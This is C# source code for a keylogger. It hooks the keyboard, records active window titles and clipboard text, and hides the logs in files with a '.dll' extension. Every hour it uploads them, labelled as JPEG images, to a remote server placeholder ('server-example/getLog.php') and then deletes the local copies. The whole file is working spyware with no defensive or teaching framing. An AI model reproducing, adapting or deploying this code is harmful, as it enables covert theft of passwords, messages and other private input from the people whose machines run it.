using Keystroke.API;
using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using WK.Libraries.SharpClipboardNS;
using static WK.Libraries.SharpClipboardNS.SharpClipboard;

namespace Keylogger
{
    class Program
    {
        string log = string.Empty;

        string currentWindowTitle = string.Empty;
        string currentHour = string.Empty;

        string serverLink = "http://server-example/getLog.php";
        string serverArg = "log";
        
        //Get window titles
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [STAThread]
        static void Main(string[] args)
        {
            new Program().start();
        }

        private void start()
        {
            // Clipboard handler
            var clipboard = new SharpClipboard();
            clipboard.ObservableFormats.Texts = true;
            clipboard.ClipboardChanged += ClipboardChanged;

            // Key handler
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => 
                {
                    // Clean the key
                    string character2 = cleanKey(character.ToString());

                    // Get the foreground window's title : https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
                    string windowTitle = getForegroundWindowTitle();
                    if (windowTitle != currentWindowTitle)
                    {
                        currentWindowTitle = windowTitle;
                        log = $"\n\n<newForegroundWindow>{currentWindowTitle}</newForegroundWindow>\n";
                    }

                    // Update the log variable
                    log += character2;

                    // Write logs
                    writeLogs();
                });

                Application.Run();
            }
        }

        public string cleanKey(string character)
        {
            if (character == "<enter>") { character = "\n"; }
            return character;
        }
        
        public string getForegroundWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            string windowTitle = "";
            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                windowTitle = Buff.ToString();
            }
            return windowTitle;
        }

        private void ClipboardChanged(Object sender, ClipboardChangedEventArgs e)
        {
            if (e.ContentType == SharpClipboard.ContentTypes.Text)
            {
                log = "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";
            }
        }
        
        public void writeLogs()
        {
            // Write logs https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\logs\\";
            Directory.CreateDirectory(path); // Create the path if it does not exist
            string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy_HH") + ".dll";
            
            using (StreamWriter sw = File.AppendText(Path.Combine(path, fileName)))
            {
                sw.Write(log);
            }

            // If it's a new file => send the last file
            if (
                    currentHour != DateTime.UtcNow.ToString("HH") && 
                    currentHour != ""
                )
            {
                // Get the last log file
                string[] logFiles = Directory.GetFiles(path, "*.dll", SearchOption.TopDirectoryOnly);
                foreach (string filePath in logFiles)
                {
                    if (filePath != Path.Combine(path, fileName))
                    {
                        // Upload the logs
                        NameValueCollection nvc = new NameValueCollection();
                        HttpUploadFile(serverLink, filePath, serverArg, "image/jpeg", nvc);

                        // Delete the file
                        File.Delete(filePath);
                    }
                }
            }

            log = "";
            currentHour = DateTime.UtcNow.ToString("HH");
        }

        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            // https://stackoverflow.com/questions/566462/upload-files-with-httpwebrequest-multipart-form-data
            //Console.WriteLine(string.Format("Uploading {0} to {1}", file, url));
            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");

            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.ContentType = "multipart/form-data; boundary=" + boundary;
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = System.Net.CredentialCache.DefaultCredentials;

            Stream rs = wr.GetRequestStream();

            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
            foreach (string key in nvc.Keys)
            {
                rs.Write(boundarybytes, 0, boundarybytes.Length);
                string formitem = string.Format(formdataTemplate, key, nvc[key]);
                byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
                rs.Write(formitembytes, 0, formitembytes.Length);
            }
            rs.Write(boundarybytes, 0, boundarybytes.Length);

            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName, file, contentType);
            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
            rs.Write(headerbytes, 0, headerbytes.Length);

            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                rs.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();

            byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wresp = null;
            try
            {
                wresp = wr.GetResponse();
                Stream stream2 = wresp.GetResponseStream();
                StreamReader reader2 = new StreamReader(stream2);
                Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error uploading file", ex);
                if (wresp != null)
                {
                    wresp.Close();
                    wresp = null;
                }
            }
            finally
            {
                wr = null;
            }
        }
    }
   
}
